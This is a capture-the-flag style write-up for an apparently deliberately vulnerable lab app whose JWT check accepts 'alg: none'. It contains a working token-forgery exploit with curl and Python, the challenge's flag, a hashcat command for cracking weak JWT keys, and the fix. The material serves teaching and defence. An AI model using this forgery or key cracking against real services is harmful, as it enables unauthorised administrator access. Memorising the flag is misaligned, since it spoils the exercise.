# 01 Session Forge: a forged session token

**Target:** `https://northwind-01-session-forge.vercel.app`
**Bug:** the server reads the signing algorithm out of the token it is verifying.

---

## What this application does

Staff sign in. The server issues a JWT as the `session` cookie. The
administration page is meant to be reachable only by the `administrator`
account, and it checks one thing:

```js
if (claims.sub !== 'administrator') return refuse(...);
```

## What goes wrong

Verifying a token means deciding which algorithm to use. `apps/01-session-forge/lib/store.js`
takes that decision from the token:

```js
if (header.alg === 'none') {
  return { ...payload, _verified: false };   // no signature checked
}
if (header.alg !== 'HS256') return null;
```

`alg` is inside the token. The person holding the token chooses which branch
runs, and one branch returns the payload without checking anything.

`alg: none` is the JWT specification's marker for an unsigned token, and
conforming libraries reject it. Here it is accepted.

## Reproducing it

```bash
BASE=https://northwind-01-session-forge.vercel.app

# Sign in as an ordinary account.
curl -s -c jar.txt -o /dev/null -X POST \
  -d 'username=wiener&password=peter' "$BASE/login"

# The genuine token is refused by the admin page.
curl -s -b jar.txt -o /dev/null -w 'HTTP %{http_code}\n' "$BASE/admin"
# HTTP 403
```

Now rebuild the token with `alg` set to `none` and `sub` set to
`administrator`:

```bash
TOKEN=$(awk '/session/{print $7}' jar.txt)

FORGED=$(python3 - <<'PY'
import base64, json, time
def b64(raw): return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
now = int(time.time())
header  = {"alg": "none", "typ": "JWT"}
payload = {"iss": "northwind.supply", "iat": now, "exp": now + 3600,
           "sub": "administrator", "name": "Wiener Vogel"}
print(b64(json.dumps(header,  separators=(",", ":")).encode()) + "." +
      b64(json.dumps(payload, separators=(",", ":")).encode()) + ".")
PY
)

curl -s -H "Cookie: session=$FORGED" "$BASE/admin" | grep -oE 'G24\{[^}]+\}'
# G24{N0t_4_Cl4im_V3r1f13d}
```

Three edits and no cryptography. The empty signature is not a forgery of the
signature; it is an instruction to the server not to check one.

## The fix

```js
if (header.alg !== 'HS256') return null;
```

Configure the allowed algorithm in the signing library instead, so the choice
is not made in application code where it can be forgotten.

## Other things that do not work here

- `alg: None`, `NONE`, `nOnE`: rejected. Accepting a case variant would be the
  same bug again.
- A modified payload with the original signature: rejected, the signature
  covers the payload.
- An expired token: rejected, the `none` branch still checks `exp`.

## Related

Algorithm confusion is the same mistake with a different payload: if the
server decides between HS256 and RS256 by reading `alg`, an attacker can
present an HS256 token and supply the public key as the HMAC secret. Weak keys
are a separate problem: `hashcat -a 0 -m 16500 <jwt> <wordlist>` cracks them
offline. This application uses a strong key, so that path is closed.

## Checking it

```bash
BASE=https://northwind-01-session-forge.vercel.app bash apps/solve/solve-01.sh
```